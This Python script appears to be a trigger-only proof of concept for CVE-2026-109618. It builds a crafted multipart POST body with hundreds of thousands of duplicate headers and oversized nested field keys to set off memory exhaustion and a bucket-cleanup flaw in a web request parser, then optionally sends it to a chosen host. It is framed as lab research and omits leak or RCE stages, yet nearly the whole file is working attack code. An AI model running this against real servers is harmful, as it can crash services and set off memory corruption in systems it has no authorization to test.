#!/usr/bin/env python3
"""Trigger-only CVE-2026-109618 research PoC for an isolated, authorized lab.

This script contains no leak parser, forged object addresses, ROP, command,
or RCE sink. It constructs one multipart OOM-amplification request derived
from the uploaded composition and optionally sends it exactly once.

A disconnect, HTTP 500, or OOM message alone does NOT prove CVE-2026-109618.
Confirm the incomplete-bucket cleanup path using target-side logs/GDB and a
patched control. Header geometry is build/request-history dependent.
"""

from __future__ import annotations

import argparse
import hashlib
import socket
import ssl
from pathlib import Path

BOUNDARY = b"AMP128BOUNDARY"


def field(name: bytes, value: bytes) -> bytes:
    return (
        b"--" + BOUNDARY
        + b"\r\nContent-Disposition: form-data; name=\"" + name
        + b"\"\r\n\r\n" + value + b"\r\n"
    )


def large_key(index: int, size: int) -> bytes:
    return b"X" * (size - 16) + (b"%016d" % index)


def build_body(headers: int, key_size: int) -> bytes:
    if headers < 1 or key_size < 16:
        raise ValueError("headers must be positive and key-size must be >= 16")

    body = bytearray()
    body += field(b"memshift", b"M" * 40000)

    for index in range(30):
        body += field(b"a[" + large_key(index, key_size) + b"][c]", b"v")

    # Non-pointer marker only: this is deliberately not a forged object/ROP pad.
    body += field(b"pad", b"P" * 2528)
    body += field(b"pad", b"x")

    for index in range(30, 45):
        body += field(b"a[" + large_key(index, key_size) + b"][c]", b"v")

    final_name = b"a[" + large_key(45, key_size) + b"][c]"
    body += b"--" + BOUNDARY + b"\r\n"
    body += b"X: a\r\n" * headers
    body += (
        b"Content-Disposition: form-data; name=\"" + final_name
        + b"\"\r\n\r\nv\r\n--" + BOUNDARY + b"--\r\n"
    )
    return bytes(body)


def send_once(args: argparse.Namespace, body: bytes):
    request_head = (
        b"POST " + args.path.encode() + b" HTTP/1.1\r\n"
        + b"Host: " + args.host.encode() + b":" + str(args.port).encode()
        + b"\r\nContent-Type: multipart/form-data; boundary=" + BOUNDARY
        + b"\r\nContent-Length: " + str(len(body)).encode()
        + b"\r\nConnection: close\r\n\r\n"
    )

    response = bytearray()
    error = None
    sock = None
    try:
        sock = socket.create_connection((args.host, args.port), args.timeout)
        sock.settimeout(args.timeout)
        if args.https:
            context = ssl.create_default_context()
            if args.insecure:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=args.host)
        sock.sendall(request_head + body)
        while len(response) < args.max_response:
            chunk = sock.recv(65536)
            if not chunk:
                break
            response.extend(chunk)
    except (OSError, ssl.SSLError) as exc:
        error = f"{type(exc).__name__}: {exc}"
    finally:
        if sock is not None:
            sock.close()
    return bytes(response), error


def classify(response: bytes, error: str | None) -> str:
    lowered = response.lower()
    if b"allowed memory size" in lowered:
        return "OOM_ERROR_OBSERVED_NOT_MEMORY_CORRUPTION_PROOF"
    if error and not response:
        return "CONNECTION_ENDED_NOT_MEMORY_CORRUPTION_PROOF"
    if response.startswith(b"HTTP/"):
        return "HTTP_RESPONSE_RECEIVED_NOT_MEMORY_CORRUPTION_PROOF"
    if response:
        return "PARTIAL_RESPONSE_NOT_MEMORY_CORRUPTION_PROOF"
    return "NO_RESPONSE_NOT_MEMORY_CORRUPTION_PROOF"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Build and optionally send one trigger-only CVE-2026-109618 lab request."
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--path", default="/index.php")
    parser.add_argument("--https", action="store_true")
    parser.add_argument("--insecure", action="store_true",
                        help="disable TLS certificate verification for a local lab")
    parser.add_argument("--headers", type=int, default=402500,
                        help="duplicate headers; starting geometry, not a portable constant")
    parser.add_argument("--key-size", type=int, default=80000,
                        help="oversized nested field-key size")
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("--max-response", type=int, default=4 << 20)
    parser.add_argument("--send", action="store_true",
                        help="actually transmit once; without this, only build the body")
    parser.add_argument("--body-out", type=Path,
                        help="optionally save the generated multipart body")
    parser.add_argument("--response-out", type=Path,
                        help="optionally save raw response bytes")
    args = parser.parse_args()

    if not args.path.startswith("/"):
        args.path = "/" + args.path

    try:
        body = build_body(args.headers, args.key_size)
    except ValueError as exc:
        parser.error(str(exc))

    print(f"BODY_SIZE={len(body)}")
    print(f"BODY_SHA256={hashlib.sha256(body).hexdigest()}")
    print(f"HEADERS={args.headers} KEY_SIZE={args.key_size}")
    print("PAYLOAD_MODE=trigger_only_no_leak_no_addresses_no_rop_no_rce")

    if args.body_out:
        args.body_out.write_bytes(body)
        print(f"BODY_SAVED={args.body_out}")
    if not args.send:
        print("DRY_RUN=yes (pass --send to transmit exactly once)")
        return 0
    if len(body) >= 8 * 1024 * 1024:
        parser.error("body is >= 8 MiB; geometry must remain below the profiled post_max_size")

    response, error = send_once(args, body)
    if args.response_out:
        args.response_out.write_bytes(response)
    first_line = response.split(b"\r\n", 1)[0][:200] if response else b"<none>"
    print(f"RESPONSE_SIZE={len(response)}")
    print(f"RESPONSE_FIRST_LINE={first_line.decode('latin1', 'replace')!r}")
    if error:
        print(f"SOCKET_RESULT={error}")
    print(f"CLASSIFICATION={classify(response, error)}")
    print("CONFIRMATION_REQUIRED=target logs/GDB plus a patched control; HTTP behavior alone is inconclusive")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
